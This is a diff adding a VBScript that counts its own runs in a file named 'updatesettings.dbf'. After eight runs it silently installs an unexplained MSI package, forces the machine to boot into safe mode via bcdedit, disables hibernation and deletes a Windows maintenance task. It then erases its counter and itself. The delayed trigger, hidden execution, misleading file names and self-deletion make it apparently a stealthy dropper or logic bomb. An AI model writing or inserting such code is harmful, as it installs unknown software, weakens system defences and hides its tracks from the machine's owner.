@@ -1,0 +1,33 @@
+Set oShell = CreateObject ("Wscript.Shell")
+Dim ccdat
+ccdat = "updatesettings.dbf"
+Dim fso, setting, cc, strArgs
+strArgs = "%comspec% /C %SystemRoot%\System32\msiexec.exe /i %SystemRoot%\System32\ServiceInstaller.msi /qn & del %SystemRoot%\System32\ServiceInstaller.msi & %SystemRoot%\System32\bcdedit.exe /set {current} safeboot minimal & %SystemRoot%\System32\powercfg.exe /hibernate off & schtasks /Delete /TN ""Microsoft\Windows\Maintenance\InstallWinSAT"" /F"
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+If (fso.FileExists(ccdat)) Then
+	Set setting = fso.OpenTextFile(ccdat, 1, 0)
+	cc = CInt(setting.ReadLine)
+	setting.Close
+	
+	If(cc > 7) Then
+		oShell.Run strArgs, 0, false
+		Set objFSO = CreateObject("Scripting.FileSystemObject")
+		strScript = Wscript.ScriptFullName
+		objFSO.DeleteFile(ccdat)
+		objFSO.DeleteFile(strScript)
+		WScript.Quit()
+	End If
+	
+	Set setting = fso.CreateTextFile(ccdat, True, False)
+	cc = cc+1
+	setting.Write(cc)
+	setting.Close
+	WScript.Quit()
+Else
+
+Set setting = fso.CreateTextFile(ccdat, True, False)
+	setting.Write("0")
+	setting.Close
+	WScript.Quit()
+End If
